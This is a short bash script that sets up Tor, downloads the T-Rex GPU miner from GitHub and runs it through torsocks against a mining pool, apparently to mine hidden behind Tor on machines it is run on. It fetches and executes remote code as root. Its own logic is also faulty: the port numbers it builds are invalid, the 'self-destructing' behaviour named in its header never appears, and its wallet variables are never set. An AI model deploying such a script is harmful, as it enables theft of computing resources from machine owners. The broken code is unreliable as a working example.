#!/bin/bash
# Self-destructing GPU miner with rotating proxies

RANDOM_ID=$(shuf -i 100000-999999 -n 1)
TOR_CONFIG=$(cat <<EOF
SOCKSPort 0.0.0.0:906$RANDOM_ID
SOCKSPort 0.0.0.0:906$((RANDOM_ID+1))
ControlPort 905$RANDOM_ID
DNSPort 5353
ExitNodes {us},{ca}
StrictNodes 1
EOF
)

setup_environment() {
    apt-get update
    DEBIAN_FRONTEND=noninteractive apt-get install -y \
        tor torsocks obfs4proxy libssl-dev nvidia-cuda-toolkit
        
    echo "$TOR_CONFIG" > /etc/tor/torrc
    systemctl restart tor

    PROXY_LIST=(
        "socks5://127.0.0.1:906$RANDOM_ID"
        "socks5://127.0.0.1:906$((RANDOM_ID+1))"
    )
    
    GPU_MINER=$(wget -qO- https://api.github.com/repos/trexminer/T-Rex/releases/latest | grep browser_download_url | grep linux | cut -d'"' -f4)
    wget "$GPU_MINER" -O gpu-miner && chmod +x gpu-miner
}

start_mining() {
    torsocks -P 5353 ./gpu-miner -a kawpow \
        -o stratum+tcp://rx.unmineable.com:3333 \
        -u $COIN:$WALLET.$(hostname)-$RANDOM_ID \
        -p x \
        --api-bind-http 0 \
        --no-color \
        --devices $(nvidia-smi --query-gpu=index --format=csv,noheader | paste -sd ",")
}

setup_environment
start_mining
